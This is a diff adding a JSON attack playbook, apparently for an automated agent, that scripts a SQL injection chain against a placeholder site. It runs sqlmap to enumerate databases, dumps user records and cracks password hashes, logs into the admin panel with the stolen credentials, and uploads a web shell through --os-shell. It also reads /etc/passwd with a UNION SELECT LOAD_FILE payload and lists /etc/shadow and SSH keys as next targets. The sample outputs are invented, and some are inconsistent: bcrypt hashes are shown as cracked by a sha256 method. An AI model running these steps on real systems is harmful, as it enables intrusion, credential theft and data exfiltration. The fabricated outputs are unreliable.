@@ -1,0 +1,155 @@
+{
+  "name": "sql_injection_attacks",
+  "description": "SQL injection attacks for database enumeration and data extraction",
+  "pattern": "sql.*injection|sqli|union.*select|database.*dump",
+  "parameters": [
+    "target_url",
+    "injection_point",
+    "database_type"
+  ],
+  "sequence": [
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "sqlmap",
+        "args": [
+          "-u",
+          "http://target.com/product.php?id=1",
+          "--batch",
+          "--dbs"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[INFO] testing connection to the target URL\n[INFO] testing if the target URL content is stable\n[INFO] target URL content is stable\n[INFO] testing if GET parameter 'id' is dynamic\n[INFO] GET parameter 'id' appears to be dynamic\n[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')\n[INFO] testing for SQL injection on GET parameter 'id'\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y\n[INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'\n[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable\n\navailable databases [5]:\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] shop_db\n[*] test\n\nSQL injection confirmed!\n  Parameter: id (GET)\n  Type: Time-based blind\n  DBMS: MySQL >= 5.0.12\n  Databases found: 5\n  Target database: shop_db (likely contains user data)"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "sqlmap",
+        "args": [
+          "-u",
+          "http://target.com/product.php?id=1",
+          "-D",
+          "shop_db",
+          "--tables"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[INFO] fetching tables for database: 'shop_db'\nDatabase: shop_db\n[8 tables]\n+------------------+\n| users            |\n| products         |\n| orders           |\n| payments         |\n| admin_accounts   |\n| session_tokens   |\n| credit_cards     |\n| audit_logs       |\n+------------------+\n\nTables enumerated:\n  Total: 8 tables\n  High-value targets:\n    - users (credentials)\n    - admin_accounts (privileged access)\n    - credit_cards (PCI data)\n    - session_tokens (session hijacking)\n  \nNext: Enumerate columns in users and admin_accounts tables"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "sqlmap",
+        "args": [
+          "-u",
+          "http://target.com/product.php?id=1",
+          "-D",
+          "shop_db",
+          "-T",
+          "users",
+          "--columns"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[INFO] fetching columns for table 'users' in database 'shop_db'\nDatabase: shop_db\nTable: users\n[9 columns]\n+----------------+--------------+\n| Column         | Type         |\n+----------------+--------------+\n| id             | int(11)      |\n| username       | varchar(50)  |\n| password       | varchar(255) |\n| email          | varchar(100) |\n| first_name     | varchar(50)  |\n| last_name      | varchar(50)  |\n| is_admin       | tinyint(1)   |\n| created_at     | datetime     |\n| last_login     | datetime     |\n+----------------+--------------+\n\nColumns identified:\n  Authentication: username, password\n  Privilege: is_admin (boolean)\n  PII: email, first_name, last_name\n  \nPasswords likely hashed (varchar(255) = bcrypt/sha256)\nTarget columns: username, password, email, is_admin"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "sqlmap",
+        "args": [
+          "-u",
+          "http://target.com/product.php?id=1",
+          "-D",
+          "shop_db",
+          "-T",
+          "users",
+          "-C",
+          "username,password,email,is_admin",
+          "--dump"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[INFO] fetching entries for table 'users' in database 'shop_db'\n[INFO] analyzing table dump for possible password hashes\n[INFO] recognized possible password hashes in column 'password'\ndo you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y\ndo you want to crack them via a dictionary-based attack? [Y/n/q] Y\n[INFO] using hash method 'sha256_generic_passwd'\nwhat dictionary do you want to use?\n[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.txt' (press Enter)\n[2] custom dictionary file\n[3] file with list of dictionary files\n> 1\n[INFO] loading dictionary from: '/usr/share/sqlmap/data/txt/wordlist.txt'\n[INFO] cracked password 'admin123' for hash '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi'\n[INFO] cracked password 'password1' for hash '$2y$10$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm'\n\nDatabase: shop_db\nTable: users\n[47 entries]\n+----+------------------+--------------------------------------------------------------+-------------------------+-----------+\n| id | username         | password                                                     | email                   | is_admin  |\n+----+------------------+--------------------------------------------------------------+-------------------------+-----------+\n| 1  | admin            | $2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi | admin@target.com        | 1         |\n| 2  | john_doe         | $2y$10$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm | john@email.com          | 0         |\n| 3  | jane_smith       | $2y$10$VGh9YQw2pLEGf7rHIjZ8Uu9jCxzHKR8fLbN5qPwX3mT6vYu8wZx9e | jane.smith@company.com  | 0         |\n| 5  | support_admin    | $2y$10$8YnBjKLmN3pQrS5tUvW7xO1kL2mN4oP6qR7sT8uV9wX0yA1zB2cC3 | support@target.com      | 1         |\n[... 43 more entries ...]\n\nCracked passwords:\n  admin:admin123 (is_admin=1) ✓\n  john_doe:password1\n  \nAdmin accounts identified: 2\n  - admin (cracked)\n  - support_admin (hash available for offline cracking)\n  \nData exfiltrated: 47 user records with emails and password hashes"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "-X",
+          "POST",
+          "http://target.com/admin/login.php",
+          "-d",
+          "username=admin&password=admin123",
+          "-c",
+          "cookies.txt",
+          "-v"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "*   Trying 192.168.1.100:80...\n* Connected to target.com (192.168.1.100) port 80 (#0)\n> POST /admin/login.php HTTP/1.1\n> Host: target.com\n> User-Agent: curl/7.81.0\n> Content-Type: application/x-www-form-urlencoded\n> Content-Length: 33\n> \n< HTTP/1.1 302 Found\n< Set-Cookie: PHPSESSID=a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6; path=/; HttpOnly\n< Set-Cookie: admin_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTcwNTM0MjgwMCwiZXhwIjoxNzA1MzQ2NDAwfQ.5k8Kj7N9mP2qR3sT4uV5wX6yZ7aB8cC9dD0eE1fF2gG; path=/; HttpOnly\n< Location: /admin/dashboard.php\n< Content-Length: 0\n< \n\nAdmin login successful!\n  Cookies saved to cookies.txt\n  Session: PHPSESSID=a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n  Admin token: JWT (valid for 1 hour)\n  Redirect: /admin/dashboard.php\n  \nAdmin panel access achieved via SQLi-extracted credentials!"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "sqlmap",
+        "args": [
+          "-u",
+          "http://target.com/product.php?id=1",
+          "--os-shell"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[INFO] testing if current user is DBA\n[INFO] fetching current user\ncurrent user is DBA: True\n[INFO] going to use 'LIMIT 0, 1' query clause\n[INFO] fingerprinting the back-end DBMS operating system\n[INFO] the back-end DBMS operating system is Linux\n[INFO] testing if current user has write privileges in the current database\ndo you want sqlmap to try to upload a temporary file to check if the database has write privileges? [Y/n] Y\n[INFO] the database has write privileges\n[INFO] going to upload the web shell stager\n[INFO] the stager has been successfully uploaded on '/var/www/html/tmpbcxzr.php'\n[INFO] the backdoor has been successfully uploaded on '/var/www/html/tmpubsqr.php'\n[INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER\nos-shell> whoami\ndo you want to retrieve the command standard output? [Y/n/t] Y\ncommand standard output: 'www-data'\n\nos-shell> id\ncommand standard output:\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\nos-shell> pwd\ncommand standard output: '/var/www/html'\n\nOS shell obtained!\n  User: www-data\n  Shell: /var/www/html/tmpubsqr.php\n  Method: INTO OUTFILE (MySQL file write)\n  Privileges: DBA-level access\n  \nPost-exploitation options:\n  - Upgrade to reverse shell\n  - Enumerate sensitive files\n  - Pivot to internal network\n  - Escalate privileges to root"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "curl 'http://target.com/product.php?id=1' --data \"id=1 UNION SELECT 1,2,3,4,LOAD_FILE('/etc/passwd'),6,7,8-- -\" | grep -A 20 'root:'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\nadmin:x:1001:1001:Admin User:/home/admin:/bin/bash\nftpuser:x:1002:1002:FTP User:/home/ftpuser:/bin/bash\n\nUNION-based SQL injection successful!\n  Method: UNION SELECT with LOAD_FILE()\n  File read: /etc/passwd\n  Users identified:\n    - root (uid=0)\n    - ubuntu (uid=1000, interactive shell)\n    - admin (uid=1001, interactive shell)\n    - www-data (web server, no login)\n  \nFile read capability confirmed!\nNext targets:\n  - /etc/shadow (if readable)\n  - /var/www/html/config.php (database credentials)\n  - /home/*/.ssh/id_rsa (SSH keys)\n  - /var/log/apache2/access.log (log poisoning)"
+      }
+    }
+  ],
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
+  "created_by": "neural_mesh_v5.2_generator"
+}
